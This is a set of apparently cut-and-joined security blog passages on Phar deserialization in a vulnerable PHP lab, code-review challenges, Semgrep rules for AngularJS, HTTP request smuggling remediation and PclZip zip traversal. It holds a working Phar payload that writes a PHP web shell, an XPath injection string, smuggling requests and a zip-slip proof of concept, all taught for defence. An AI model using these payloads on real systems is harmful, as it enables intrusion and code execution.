lstat               mkdir               parse_ini_file      readfile            rename              rmdir               stat                touch               unlink  Note: Just like normal object injection, PHP Magic Methods and autoloading/include of the POP gadget to trigger is still needed.Example (https://github.com/weev3/LKWA) Phar DeserializationAn upload functionality exists in upload.php&lt;?phpinclude(\"sidebar.php\");$target_dir = \"uploads/\";$target_file = $target_dir . basename($_FILES[\"fileToUpload\"][\"name\"]);$uploadOk = 1;$imageFileType = strtolower(pathinfo($target_file,PATHINFO_EXTENSION));// Check if image file is a actual image or fake imageif(isset($_POST[\"submit\"])) {    if($imageFileType !== \"PHAR\") {        $uploadOk = 1;    } else {        echo \"File is not a PHAR file.\";        $uploadOk = 0;    }}// Check if file already existsif (file_exists($target_file)) {    echo \"Sorry, file already exists.\";    $uploadOk = 0;}// Allow certain file formatsif($imageFileType != \"phar\") {    echo \"Sorry, only PHAR file is allowed.\";    $uploadOk = 0;}// Check if $uploadOk is set to 0 by an errorif ($uploadOk == 0) {    echo \"Sorry, your file was not uploaded.\";// if everything is ok, try to upload file} else {    if (move_uploaded_file($_FILES[\"fileToUpload\"][\"tmp_name\"], $target_file)) {        echo \"The file \". basename( $_FILES[\"fileToUpload\"][\"name\"]). \" has been uploaded.\";    } else {        echo \"Sorry, there was an error uploading your file.\";    }}?&gt;https://github.com/weev3/LKWA/blob/master/phar_deserial/upload.phpThis above code checks if a given upload is a phar file, the file_exists function is also used to see if the file has already been uploaded. Aftr the checks, the file is uploaded. This functionality can be used to upload a PHAR file.Within phar_deserial.php, the following code can be seen:include(\"sidebar.php\");class log{\tpublic $filename=\"log.txt\";\tpublic $data=\"log\";    function __wakeup(){        file_put_contents($this-&gt;filename, $this-&gt;data);    }}if (file_exists($_GET['file'])) { $var = new log();}https://github.com/weev3/LKWA/blob/master/phar_deserial/phar_deserial.phpSince the file_exists($_GET[‘file’] function is used with a user provided input. It is possible to set the value of the input to the previously uploaded Phar file. Example: phar://../uploads/phar_file.phar. The PHP application will perform a filesystem call on the provided wrapper, such as verifying if the file exists on the disk by calling file_exists(“phar://../uploads/phar_file.phar”). and the Phar’s metadata will be unserialized, taking advantage of the gadgets/POP chains to complete the exploitation chain. In this instance, the __wakeup magic method can be leveraged for code execution by writing some PHP code and calling it.The following code can be used to create a PHAR file&lt;?phpclass log{        function __wakeup(){    }}$payload = new log();$payload-&gt;filename = 'shell.php5';$payload-&gt;data = \"&lt;?php echo shell_exec(\\$_GET['e'].' 2&gt;&amp;1'); ?&gt;\";var_dump($payload);// create new Phar@unlink(\"payload.phar\");$phar = new Phar('payload.phar');$phar-&gt;startBuffering();$phar-&gt;addFromString('test.txt', 'text');$phar-&gt;setStub('&lt;?php __HALT_COMPILER(); ? &gt;');//set payload$phar-&gt;setMetadata($payload);$phar-&gt;stopBuffering();?&gt;This phar file can be uploaded using upload.php.This payload.phar can be called through the phar_deserial.php file.GET /phar_deserial/phar_deserial.php?file=phar%3a%2f%2fpharfile.phar HTTP/1.1Host: lkwa.local:3000User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:84.0) Gecko/20100101 Firefox/84.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Accept-Language: en-GB,en;q=0.5Accept-Encoding: gzip, deflateConnection: closeCookie: username=O%3A8%3A%22stdClass%22%3A1%3A%7Bs%3A4%3A%22user%22%3Bs%3A5%3A%22admin%22%3B%7DUpgrade-Insecure-Requests: 1To test if things are working locally, you can testing using a code such as&lt;?phpclass log{\tpublic $filename=\"log.txt\";\tpublic $data=\"log\";    function __wakeup(){        file_put_contents($this-&gt;filename, $this-&gt;data);    }}// output: ripsinclude('phar://payload.phar');?&gt;Phar Deserialization Real World Vulnerabilities  DomPDF Phar Serialization  LimeSurvey &lt; 3.16 - Remote Code Execution  mpdf Insecure PHP deserialization through phar:// wrapper  TCPDF Phar Deserialization  phpbb3 Phar Deserialization  PEAR Archive_Tar1Useful Notes  Inclusion of the Phar file for deserialization can be local or remote  If a file upload functionality only allows jpg, you can use a phar-jpg polyglot: https://github.com/kunte0/phar-jpg-polyglot  If you are trying to leverage a __destruct magic method as part of your POP chain and the if destructor is never called, you can use “fast destruct method” in PHPGGC to make sure it’s called right after the unserialize. The -f option with PHPGGC will place your popchain in an array and overwrite its entry with another value, losing the only reference to your instance.References  https://blog.ripstech.com/2018/new-php-exploitation-technique/  https://www.drupal.org/sa-core-2020-013  https://i.blackhat.com/us-18/Thu-August-9/us-18-Thomas-Its-A-PHP-Unserialization-Vulnerability-Jim-But-Not-As-We-Know-It-wp.pdf  https://medium.com/@knownsec404team/extend-the-attack-surface-of-php-deserialization-vulnerability-via-phar-d6455c6a1066  https://github.com/s-n-t/presentations/blob/master/us-18-Thomas-It’s-A-PHP-Unserialization-Vulnerability-Jim-But-Not-As-We-Know-It-wp.pdf  https://blog.certimetergroup.com/it/articolo/security/polyglot_phar_deserialization_to_rce"

This is given as part of the HttpPost constructor and a new object called postis made which has “https://” + connName + “/v1/boot”. This is then given to the httpClient.execute method which will make a request to the crafted url and return the response.

Within function auth, the $userId and $passwd parameter is used to create an XPath query without any sanitization/validation: loginID=$userId and passwd=’$passwd’This query is used to check if the provided userid and password exists within employees.xml. This check is within the line return ($employee-&gt;length == 0) ? false : true;. This could be abused by a user and bypass this check by injecting something like ‘ OR ‘6’=’6 .Challenge 4using System.IO;using System.Net;using System.Net.Http;using Microsoft.AspNetCore.Mvc;namespace core_api.Controllers{    public class DataDownloadController : Controller {        public readonly string AvatarFolder = \"images/avatars/\";        [HttpGet]        public HttpResponseMessage GetAvatar(string image) {            if (string.IsNullOrWhiteSpace(image) || image.Contains(\"/\")) {                return new HttpResponseMessage(HttpStatusCode.BadRequest) {                    Content =  new StringContent(\"Valid avatar required\")};                }            string img = System.IO.Path.Combine(AvatarFolder, image);            if (!img.Contains(AvatarFolder) || !System.IO.File.Exists(img)) {                 return new HttpResponseMessage(HttpStatusCode.NotFound) {                    Content =  new StringContent(\"Avatar not found\")};            }            var fileInfo = new System.IO.FileInfo(img);            var type = fileInfo.Extension;            var c = new StreamContent(fileInfo.OpenRead());            c.Headers.ContentType = new System.Net.Http.Headers.

This is then given to the GetAvatar as an argument. This function checks if the user value contains a / character and if it does, an error is returned to the user. If this check is not triggered, then the user provided value is combined with images/avatar path using the System.IO.Path.Combine method. A new constructor is created with the System.IO.FileInfo class which provides methods for creation, copying, deletion, moving, and opening of files. The File.OpenRead method is used to fetch the file in this path. On windows systems, the ..\\ pattern or ../ pattern can be used to traverse directories. As such, the above code is vulnerable to Path Traversal.Challenge 5from django.contrib import messagesfrom django.shortcuts import render, redirectfrom django.contrib.sites.shortcuts import get_current_sitefrom django.template.loader import render_to_stringfrom django.utils.http import urlsafe_base64_encode, urlsafe_base64_decodefrom django.utils.encoding import force_bytes, force_textfrom django.views.decorators.http import require_http_methodsfrom hashlib import sha1from project.decorators import check_recaptchafrom project.forms import UserSignUpFormfrom project.settings import configfrom sendgrid import SendGridAPIClientfrom sendgrid.helpers.mail import Mailfrom django.contrib.auth import get_user_modelUser = get_user_model()@check_recaptcha@require_http_methods([\"POST\"])def register(request):    form = UserSignUpForm(request.POST)    if form.is_valid() and request.recaptcha_is_valid:        user = form.save(commit=False)        user.is_active = False        user.save()        message = render_to_string('mail/activate.html', {            'user': user,            'uid': urlsafe_base64_encode(force_bytes(user.pk)),            'token': sha1(force_bytes(user.pk)).hexdigest(),        })        message = Mail(            from_email='noreply@' + get_current_site(request).domain,            to_emails=request.POST.get('email'),            subject='Your account activation email',            html_content=message)        response = SendGridAPIClient(config['SG_API_KEY']).send(message)        messages.add_message(request, messages.SUCCESS, 'Verification email sent.')    else:        return render(request, 'account/register.html', {'form': form})    return render(request, 'account/register.html', {'form': UserSignUpForm()})In the above code, the SHA1 hashing algorithm is used without a salt to generate a token.: sha1(force_bytes(user.pk)).hexdigest().

    "content": "AngularJS Security is something I have looked into in the past. In 2016, I conducted a workshop on AngularJS Security in MWR’s MWRICON which highlighted some common security issues and how they could be exploited. The materials of this workshop can be seen here: MWRICON 2018.I recently took notice of Semgrep which is a Lightweight static analysis tool. Semgrep is an interesting tool for code reviewers which is more expressive than grep, and is easily customizable to conduct semantic analysis. Since Semgrep is lightweight and fast, it is easy to implement this in a CI/CI pipeline.SemgrepSemgrep is fairly easy to setup and install pip3 install semgrep. Furthermore, the Semgrep Live Editor can also be used to write and save rules on r2c’s system.Semgrep uses pfff (PHP Frontend For Fun) which is a static analysis engine previously developed by facebook and was then deprecated. The developer Yoann Padioleau who initially wrote this now works for r2c. pfff is written in OCaml and it is a set of modules (only few are used as part Semgrep I think).Semgrep internally uses a generic parser using yacc and ocaml-tree-sitter and some custom code to convert any programming language into an Intermediate Language/AST and then it is possible to conduct Fuzzy AST to AST Matching on this result.Looking at the engine code, there are references to pointer analysis and datalog but this doesn’t seem to be currently use and Dataflow/taint analysis seems to be planned in the future release by r2c.Semgrep can be considered a good alternative for ESLint since  Well documented, rules are meant to be powered by community  Semgrep is provided under LGPL-license and is free for commercial use  Very easy to write custom configurations and semantic rules.  Supports popular languages incuding Python, JavaScript, Java, Go, C with PHP and TypeScript support on the way 🥳As such I ported multiple rules from AngularJS Security Rules For ESLint to Semgrep. The pull request I made can be seen here: Pull Request to semgrep-rules repository. This blog post will highlight the basics of using Semgrep with some AngularJS examples.Writing Rules - Strict Contextual escaping (SCE) ExampleIn the code below, the $sceProvider is set to false. Disabling Strict Contextual escaping (SCE) in an AngularJS application could provide additional attack surface for XSS vulnerabilities.var app = angular.module('MyApp', []).config(function ($sceProvider) {    // ruleid: detect-angular-sce-disabled     $sceProvider.enabled(false);}); app.controller('myCtrl', function($scope) { $scope.userInput = 'foo';     $scope.sayHello = function() {\t  $scope.html = \"Hello &lt;b&gt;\" + $scope.userInput + \"&lt;/b&gt;!\"    }; });An example such as the above can be easily solved by using Semgrep since you only need to check if the value of $sceProvider.enabled is false. Live Editor - SCE Disabled rules:- id: my_pattern_id  pattern: |    $sceProvider.enabled(false);  message: |    Semgrep found a match  severity: WARNINGAnd due to the Semgrep only matching AST, this can be used to easily traverse through large codebases quickly.Writing Rules - Open Redirect ExampleThe below code is a command example of open redirect that might happen when user input is conce $window.location.hrefvar app = angular.module('MyApp', []);app.controller('myCtrl', function($scope, $sce) {$scope.userInput = 'foo';    $scope.sayHello = function() {     $window.location.href = input + '/app/logout';     input = $scope.input;     $window.location.href = input + '/app/logout';     //Data is not coming from user input     $location.location.location = test     $window.location.href = \"//untatintedredirect\"   };});One way to match code like this is to use MetaVariables and Expression Matching and the pattern: | option. Expression matching searches code for the given pattern. This pattern can match a full expression, or be part of a subexpression and this can be used to identify concatenation., and metavariables are used to track a value across a specific code scope.This includes variables, functions, arguments, classes, object methods, imports, exceptions, and more. Typed Metavariables are also supported for Java. More information regarding these two features can be seen here: Pattern Features      patterns:        - pattern-either:           - pattern: |              $SOURCE = $INPUT;              $window.location.href = $SOURCE + $STATICVALUE;          - pattern: |              $window.location.href = $SOURCE + $STATICVALUE;This can even be taken one step further using the pattern-inside option and the ellipsis operator. The ellipsis operator can be used to search for specific function calls or function calls with specific arguments. To search for all calls to a specific function, regardless of its arguments. This can be used to check if my initial pattern is occurring inside the app.controller function.            app.controller(..., function($scope,$sce){             ...            });Live Editor ExampleThe ellipsis operator itself is very useful and can be used to check for specific function calls, method calls, function definitions, class definitions, strings, arrays and conditionals.Another example of using ellipsis is identifying the usage of angular.element method. angular.element can lead to XSS if after,append,html,prepend,replaceWith,wrap are used with user-input. This can be matched using a pattern such as the below:angular.element($SOURCE).html(...);The same concept can also be applied to match expressions that could be nested deep within another expression. Deep Expression OperatorSemgrep YAML File BreakdownPatterns/Rules can be contributed to the semgrep-rules as a YAML file. An example of a pull request can be seen here: Pull RequestAn example of a YAML file can be seen below:rules:    - id: detect-angular-translateprovider-useStrategy-method      patterns:        - pattern-either:           - pattern: |              $translateSanitization.useStrategy();        - pattern-inside: |            app.controller(..., function($scope,$sce){             ...            });      message: |                If the $translateSanitization.useStrategy is set to null or blank this can be dangerous.      languages:      - javascript      severity: WARNING      metadata:        references:            - https://docs.angularjs.org/api/ng/service/$sce#trustAsUrl            - https://owasp.org/www-chapter-london/assets/slides/OWASPLondon20170727_AngularJS.pdf    - id: detect-angular-translateprovider-translations-method      patterns:        - pattern-either:           - pattern: |              $translateProvider.translations(...,$SOURCE);        - pattern-inside: |            app.controller(..., function($scope,$sce){             ...            });      message: |                The use of $translateProvider.translations method can be dangerous if user input is provided to this API.      languages:      - javascript      severity: WARNING      metadata:        references:            - https://docs.angularjs.org/api/ng/service/$sce#trustAsUrl            - https://owasp.org/www-chapter-london/assets/slides/OWASPLondon20170727_AngularJS.pdfThis can be broken down as:  patterns – Pattern option to match  language – Language syntax that can be matchedImport YAML keys:  id - ID of a rule, multiple rules can be added in the same file which can be triggered by one ID  metadata - Provide additional information such as references/links  message -Message to display when pattern is matched  pattern - Here we specify the logical option for a pattern to be matched. This can be pattern-not, pattern-inside, pattern, pattern-not-inside etc  severity - Severity of the ruleConcluding ThoughtsWhile Semgrep doesn’t support fully fledged static/program analysis such as CodeQL, it can be useful for writing quick patterns to search through large codebases quickly. I often find these sorts of features useful when trying to find interesting starting entry points while code reviewing which I can then dig into myself.I looked forward to Semgrep being the successor of other grep based code scanning projects such as GrepBugs and other open source projects which have died in the past."

Often at my role as a Security Analyst within Snyk, I study trends within the dependency ecosystem which can result in finding interesting vulnerabilities. Recently I looked at HTTP Request Smuggling which resulted in the following disclosures.  netius HTTP Request Smuggling  reel HTTP Request Smuggling  meinheld HTTP Request Smuggling  goliath HTTP Request Smuggling  agoo HTTP Request SmugglingFor verifying the above libraries/packages/servers, i found the following tools very useful:  HTTP Request Smuggler  Turbo Intruder  Smuggler  Turbo Intruder ScriptsDemystifying HTTP request smugglingHTTP request smuggling is an interesting vulnerability type that has gained popularity over the last year. This vulnerability could allow an attacker to leverage specific features of the HTTP/1.1 protocol in order to bypass security protections, conduct phishing attacks, as well as obtain sensitive information from requests other than their own.It should also be noted that request smuggling has received widespread community attention through numerous high-paying bug bounty reports in the last few months, and Snyk observed that 18 HTTP request smuggling related to dependencies have been published in 2020 so far.This vulnerability was first discussed by Watchfire in their 2005 whitepaper entitled “HTTP Request Smuggling”. This work was later expanded upon by researcher Regis Leroy and further discussed by James Kettle from Portswigger security during BlackHat USA 2019 which gained further media attention.This blog post aims to demystify the vulnerability and provide remediation details for open source project maintainers looking to patch HTTP request smuggling within their projects.BackgroundWith new attacks and vulnerabilities gaining popularity and media traction, open source libraries are often targeted by attackers to be exploited in the wild. It can often take weeks or years for these vulnerabilities to be remediated properly within these libraries due to a lack of remediation knowledge. In order to make the open source community secure, the Snyk Security Team often conducts research into vulnerabilities, such as HTTP request smuggling, to discover vulnerabilities within open source dependencies and provide actionable remediation advice to maintainers.One such task was undertaken by Snyk to identify the impact of HTTP request smuggling within the open source dependency ecosystem which resulted in discovering numerous vulnerabilities. More information regarding the discovered vulnerabilities can be found here.Snyk found that there are not enough public sources that provide proper guidance into remediating HTTP request smuggling. Furthermore, it was noted that it took maintainers multiple releases to properly address and remediate this vulnerability. With this blog post, we aim to close that gap and help provide detailed remediation advice to any maintainer looking for guidance on this issue.HTTP request smuggling vulnerability explainedIn order to understand HTTP Request Smuggling, the following areas must first be understood:Keep-Alive and pipeliningThe concept of keep-alive and pipelining was initially published in RFC 2616.The Keep-Alive header is a hop-by-hop header that provides information about a persistent connection. In web servers, Keep-Alive can be specified within the “Connection” header which allows a web server to keep a TCP socket/connection open. By using this header, multiple requests and responses can use a single connection which can reduce overhead and improve performance for a web server. This feature is supported by all browsers and servers today.Pipelining is another feature that was introduced in RFC 2616. This allows a web server to process requests asynchronously—as a first-in-first-out stream rather than processing each request individually, allowing it to send a request without waiting for a previous response to arrive.Content-Length and Transfer-EncodingHTTP requests can have a message body. The presence of a message body in a request is signaled by a Content-Length or Transfer-Encoding header field. These headers are used for message framing, telling a server where a message ends and another begins.The Content-Length, specified in RFC 7230, section 3.3.2, is an HTTP header that indicates the size of the entity-body of the request. This is commonly seen in HTTP POST requests which have a body of data. It should be noted that GET requests typically shouldn’t contain the Content-Length header since they have no body.Transfer-Encoding, also specified in RFC 7230, was created to allow the sending of binary data over HTTP. Transfer-Encoding has numerous directives, this blog will focus on the chunked directive.The chunked directive allows data to be sent in a series of chunks along with the length of these chunks specified in hexadecimal format, followed by carriage return and a line feed. The end of a chunked directive is stated by 0 and an empty sequence. An example of a chunked request can be seen below.POST / HTTP/1.1Host: snyk.ioContent-Type: application/x-www-form-urlencodedTransfer-Encoding: chunked7 (length of chunks)foo=bar (series of chunks)0 (0 to terminate request followed by \\r\\n)(\\r\\n)Request smugglingA modern web server stack will often contain multiple web servers along with load balancers and WSGI servers. A basic diagram to visualize this can be seen as:HTTP request smuggling vulnerabilities arise when the frontend and the backend interpret the boundary of an HTTP request differently causing desynchronization between them. This is due to numerous frontend and backend libraries deviating from RFC specifications when dealing with both the Content-Length and the Transfer-Encoding header. HTTP request bodies can be framed according to these two headers and deviations from the specification occur. As a result, part of a request gets appended or smuggled, to the next one which allows the response of the smuggled request to be provided to another user.This vulnerability can be exploited to conduct phishing attacks, cache poisoning, Cross-Site Scripting (XSS), and more. More information regarding exploiting this vulnerability was published by James Kettle last year, during BlackHAT USA 2019, titled “HTTP Desync Attacks: Request Smuggling Reborn”. This blog will focus on the two most common request smuggling techniques:  CL:CL: Double Content-Length attack technique  CL:TE: Content-Length Transfer-Encoding attack techniqueCL:CL: Double Content-Length attack techniqueAccording to RFC 7230, section 3.3.3#4, “If a message is received without Transfer-Encoding and with either multiple Content-Length header fields having differing field-values or a single Content-Length header field having an invalid value, then the message framing is invalid and the recipient MUST treat it as an unrecoverable error”However, most middleware and web servers currently will loosely handle GET requests with a body. Furthermore, RFC 7231, section4.3#4.3.1 states “A payload within a GET request message has no defined semantics; sending a payload body on a GET request might cause some existing implementations to reject the request”. This indicates this is a behavior most servers and proxies might support. TIn some cases, this can result in request smuggling attacks. This blog will explore one variation of this attack.GET / HTTP/1.1Content-Length: 43Content-Length: 0Host: snyk.ioGET /reqsmuggle HTTP/1.1Host: snyk.ioWhen provided with two Content-Length headers, if implementation differences occur between a frontend and a backend on which Content-Length header to prioritize, smuggling attacks can occur.In the above HTTP request, a request with two Content-Length headers is sent to a target that has a proxy or a load balancer as a frontend. The proxy will respect and prioritize the first Content-Length and see the smuggled request as part of the request body, even though a GET request shouldn’t have a request body, and two Content-Length headers are provided. When this is processed by the backend, the first Content-Length header is ignored and the second Content-Length header is prioritized. Since the second Content-Length was set to zero, the backend will expect no request body and the /reqsmuggle request is treated as another pipelined request. As such, the response of this smuggled request could be received by another user.HTTP/1.1 200 OKContent-Length: 11hello worldHTTP/1.1 404 Not FoundConnection: CloseContent-Length: 0CL:TE: Content-Length Transfer-Encoding attack techniqueThis popular technique discovered by James Kettle of PortSwigger labs involves placing a Content-Length header and a Transfer-Encoding header in a single HTTP request and manipulating it in a way where a frontend proxy and backend server will prioritize these headers and process the smuggled request differently. An example request which demonstrates this vulnerability can be as follows.POST /login HTTP/1.1Host: snyk.ioContent-Type: application/x-www-form-urlencodedContent-Length: 62Transfer-Encoding: chunked16login=xxx&amp;amp;password=xxx0GET /404 HTTP/1.1X-Foo: barWhen this request gets processed by a frontend proxy, it will respect the Content-Length header and prioritize this over the Transfer-Encoding header. However, the backend server will prioritize the Transfer-Encoding header. As such, the backend will process the request and will end at the character 0. As a result, the 404 GET request gets treated as a separate pipelined request.This issue occurs because the frontend prioritizes the Content-Length over Transfer-Encoding header. According to RFC 7230 Section 3.3.3#3, if a message with both Content-Length and Transfer-Encoding is accepted, the Transfer-Encoding header overrides the Content-Length. This is not followed by the frontend.In cases where the frontend might prioritize the Transfer-Encoding header, it might be possible to bypass this limitation by inserting a malformed transfer encoding header instead of a valid one. Some examples of this can be seen below:Transfer-Encoding : chunkedtRANSFER-ENCODING: chunkedTransfer-Encoding: chunkNumerous HTTP libraries tolerate different variations of the Transfer-Encoding header and will normalize them to improve client experience. As such, by understanding what variations of the Transfer-Encoding header is normalized by the backend server, it might be possible to smuggle a malformed Transfer-Encoding header through the frontend and conduct a CL:TE smuggling attack.The examples above just demonstrate the vulnerability. In a real attack scenario, a smuggled request can be crafted to conduct phishing attacks, or steal data from a victim’s request and send that to an attacker-controlled server.Scope and misconceptionsDuring this research, Snyk identified numerous cases where the obvious complexity of the multiple attack vectors led to misconceptions about HTTP request smuggling being reported to open source maintainers by researchers and maintainers, not always understanding if the criteria of remediation are in the scope of their maintained library or if it should be dealt with a dependency they are using as part of their library.Some of the challenges which required further clarification are as follows:      (1.) Proxies/Load Balancers and other mediums, that can be categorized as frontend, are most affected by this vulnerability. However, a successful request smuggling attack requires the exploitation of both a vulnerable frontend and a backend.        (2.) The responsibility of remediation falls onto a backend maintainer as much as a frontend maintainer. One can argue that normalizing malformed headers should be acceptable behavior from a backend and make it more tolerant to user faults, and that the real problem is proxies which forward these requests without normalizing them first. But due to the vast ecosystem of dependencies and numerous libraries fitting the criteria of a backend and frontend, it is ideal for both parties to try and remediate this issue.        (3.) Middlewares, web servers that support reverse proxy capabilities, WSGI/High-Performance servers are considered to fit the backend criteria, not a web server that just supports the processing of malformed requests but doesn’t support pipelining.        (4.) Security reports are often disclosed to maintainers as HTTP request smuggling issues due to servers responding to multiple requests sent and this being visible as two separate responses. It should be noted that many servers support Keep-Alive and pipelining—this by itself does not make an HTTP request smuggling vulnerability. This is the case in CVE-2020-12440 reported for NGINX.  RemediationHTTP request smuggling issues occur due to deviations from the current HTTP specifications and multiple libraries not following RFC7230. Furthermore, remediation of this vulnerability can be tricky depending on whether you are a frontend or backend project maintainer. As such, Snyk has researched the remediation implemented by open source projects currently and categorized it as follows. To simplify, all remediation points are covered along with reasoning to which smuggling attack type this will remediate against. In an ideal scenario, all of the points mentioned below should be used to provide a Defense-in-Depth approach solution.Prioritize Transfer-Encoding over Content-LengthRemediation: This remediation will prevent CL:TE and TE:CL attacksScope: Frontend, BackendDetails: When a request with both a Transfer-Encoding: chunked header and Content-length is received, the transfer-encoding header should be prioritized over Content-Length. This is referenced in RFC 7230 Section 3.3.3#3.Disallow requests with both Content-length and Transfer encoding and double Content-Length headersRemediation: This remediation will prevent CL:CL, CL:TE and TE:CL attacksScope: Backend, Frontend, Backend, Upstream librariesDetails: This can be seen as a better alternative to “Prioritize Transfer-Encoding over Content-Length” solution. Runtime platforms such as Node.js have used this solution to remediate against request smuggling where any requests with both headers are returned with an HTTP 400 response.Snyk believes this technique to be an ideal fix to prevent smuggling issues. However, considerations should be taken on how the fix is applied; especially if the fix is applied to a low-level HTTP library or an upstream engine numerous packages, such as a frontend, depend upon.When remediation HTTP request smuggling issues, RFC 7230 #3.3.3 should be followed. Section 3.3.3#3 in RFC 7230 states:“If a message is received with both a Transfer-Encoding and a Content-Length header field, the Transfer-Encoding overrides the Content-Length. Such a message might indicate an attempt to perform request smuggling (Section 9.5) or response splitting (Section 9.4) and ought to be handled as an error. A sender MUST remove the received Content-Length field prior to forwarding such a message downstream.”However, this is different from what is stated within RFC 2616 4.4#3:“If a message is received with both a Transfer-Encoding header field and a Content-Length header field, the latter MUST be ignored.”It should be noted that RFC 2616 4.4#3 is obsolete and has been replaced by RFC 7230. RFC 7230 should be taken into consideration when implementing a fix. As such, when processing HTTP requests with both a Content-Length and Transfer encoding header, the correct behavior here is that the frontend should strip out the Content-length header before forwarding the request to a downstream backend, not return an HTTP 400 response header. The same should be done to requests with multiple Content-Length headers as stated in RFC 7230#3.3.2.As mentioned in RFC 7230 Section 3.3.2, if an HTTP request is received with multiple Content-Length headers with different length values, this can be remediated with an HTTP 400 response, or the duplicated field-values should be replaced with a single valid Content-Length field. Snyk recommends that low-level HTTP libraries opt to replace multiple headers with a single valid header.Disallow malformed Transfer-Encoding headers and correct Processing of Multiple TE valuesRemediation: This remediation will prevent TE:TE attacks.Scope: Frontend, BackendDetails: If both a frontend and backend prioritizes the Transfer-Encoding header, it could allow smuggling attacks where an attacker inserts two Transfer-Encoding headers, one which would be ignored by the frontend and is processed by the backend and vice versa. As such, the following type of header variations should be rejected.            TE header variation      Details                  Transfer-Encoding: chunked      Spaces before the “chunked” value are removed.              Transfer-Encoding : chunked      The header contains extra spaces. This is in violation of RFC 7230.              Transfer-Encoding: chunked      Trailing characters before the header.              Transfer-Encoding: chunk      The value “chunk” is provided which gets. Normalized by the server and is treated as chunked encoding.              Transfer-Encoding: chunked      Multiple spaces before the “chunked” value”.              Transfer-Encoding: “chunked”      The header value is provided inside double quotes which get normalized. Single quotes should also be taken into consideration.              Transfer-Encoding: chunked      CRLF characters are provided before the “chunked” value.              Transfer-Encoding: xchunked      The invalid character “x” will be removed by the backend server. Considerations should also be taken into account for unicode values provided before “chunked”. Other examples include “ch-nked”.      However, it should be noted that it’s still possible for attackers to find a malformed header variation of “chunked” encoding that is not documented above. As such, this alone should not be taken into account for remediation. A better approach would be to disallow requests with both Content-Length and Transfer-Encoding, along with disallowing malformed headers.Lastly, It should also be noted that if the “chunked” value is specified with other Transfer-Encoding values such as “gzip” or “deflate”, it shouldn’t be overlooked and Transfer-Encoding should be prioritized over Content-Length. An example of this vulnerability occurring can be seen in CVE-2019-16786. If an HTTP request is sent with the following Transfer-Encoding values, the “chunked” value should be correctly identified and prioritized:Transfer-Encoding: gzip, chunkedWithin a Transfer-Encoding header, several values can be listed separated by a comma. However, there might be cases where a frontend might only identify the “gzip” value and as such will prioritize the Content-Length header, and the backend might process this as a chunked request resulting in a CL:TE attack. Snyk recommends, whenever multiple values are specified that they are checked correctly and, if “chunked” is specified, then Transfer-Encoding be prioritized. Furthermore, if multiple transfer encoding headers are specified, the “chunked” value should only be present as the last value after other transfer encoding values are specified. This is stated in RFC 7230 Section 3.3.1.Wrapping upTo conclude, HTTP request smuggling can be a confusing vulnerability to understand and patch against. This blog hopes to help maintainers write efficient patches and secure their open source projects.It is also worth noting that this blog post only covers two techniques of HTTP request smuggling and does not provide detailed information regarding different exploitation scenarios. The following article from Security researcher ZeddYu has covered HTTP request smuggling extensively and has provided in-depth details regarding each attack smuggling vector: Zeddy Yu:Help you understand HTTP Smuggling in one article."

While looking at well known PHP ZIP dependencies, I noticed that, both pclzip and zipper were vulnerable to traversal attacks.For Zipper, I was able to verify, write a patch and contact maintainers of zipper and modern zipper forks to push a new release. Details regarding that can be found below.  https://snyk.io/vuln/SNYK-PHP-CHUMPERZIPPER-552162  https://snyk.io/vuln/SNYK-PHP-DARIUSIIIZIPPER-552163  https://snyk.io/vuln/SNYK-PHP-MADNESTMADZIPPER-552164This short blog post will try to explain how to patch this issue manually within pclzip.ZIP Path TraversalZip Path Traversal is a vulnerability where it is possible to traversal directories of a program during archive/zip extraction due to insufficient validation of user provided filenames. By leveraging this vulnerability, it is often possible to conduct arbitrary file writes within a vulnerable system, which can lead to arbitrary code execution.This vulnerability has existed over a decade and some good research around this can be found below:  http://phrack.org/issues/34/5.html#article  https://snyk.io/research/zip-slip-vulnerability  https://www.youtube.com/watch?v=Ry_yb5Oipq0pclzip VulnerabilityThis library has existed since 2009 and is extremely popular within the PHP ecosystem. Content Management systems such as WordPress and Joola currently use a forked version of pclzip within their software.pclzip within its default state is vulnerable to ZIP traversal attacks, and due to its poor outdated documentation and badly written classes, it is extremely hard to understand how to mitigate against this issue.Eventhough this package now exists within packagist, its original maintainer is now where to be found and multiple forks of this module exists within GitHub: https://github.com/search?q=pclzipVerifying ZIP TraversalTo test if the vulnerability, start by creating two different files and creating a ZIP archive with them as follows.snoopy@snoopy-XPS-15-9570:~/ziptest/poc$ echo foo &gt; test1.txtsnoopy@snoopy-XPS-15-9570:~/ziptest/poc$ echo bar &gt; xxxxxxxxxxxxxxxxxxxxxxxxxxxxtest2.txtsnoopy@snoopy-XPS-15-9570:~/ziptest/poc$ lstest1.txt  xxxxxxxxxxxxxxxxxxxxxxxxxxxxtest2.txtsnoopy@snoopy-XPS-15-9570:~/ziptest/poc$ zip -r ziptest.zip test1.txt xxxxxxxxxxxxxxxxxxxxxxxxxxxxtest2.txt   adding: test1.txt (stored 0%)  adding: xxxxxxxxxxxxxxxxxxxxxxxxxxxxtest2.txt (stored 0%)snoopy@snoopy-XPS-15-9570:~/ziptest/poc$ This ZIP can then be opened using a HEX editor and the test2 filename can be edited to be something such as ../../../../../../../../tmp/test2.txt.his can then be provided to the below example usage code.The following code demonstrates usage of PclZIp, The below code will open a ZIP file and extract its contents to a given location.&lt;?phprequire __DIR__ . '/vendor/autoload.php';$zip = new PclZip('/home/snoopy/ziptest/poc/ziptest.zip');$zip-&gt;extract(PCLZIP_OPT_PATH, '/home/snoopy/ziptest/uploads');Once executed, this will then extract both files. the test2 file has successfully extracted to the tmp directory.snoopy@snoopy-XPS-15-9570:/tmp$ cat test2.txt barsnoopy@snoopy-XPS-15-9570:/tmp$ When looking for these vulnerabilities in the wild, the following can also be useful.  https://github.com/ptoomey3/evilarc  https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/multi/fileformat/zip_slip.rb  https://github.com/snyk/zip-slip-vulnerability/tree/master/archivesPCLZIP_OPT_EXTRACT_DIR_RESTRICTION FeatureAccording to version 2.5 notes (https://github.com/ivanlanin/pclzip), this version introduced the PCLZIP_OPT_EXTRACT_DIR_RESTRICTION feature.PclZip can extract any file in any folder of a system. People may use this to upload a zip file and try to override a system file. The PCLZIP_OPT_EXTRACT_DIR_RESTRICTION will give the ability to forgive any directory transversal behavior.However, this option seems to be lacking documentation. Furthermore, this functionality seems to not work if an absolute path is specified via PCLZIP_OPT_PATH. This seems to be a problem for multiple maintainers using this package https://github.com/matomo-org/matomo/issues/1812.Patching ManuallyAn easy way to fix this feature would be 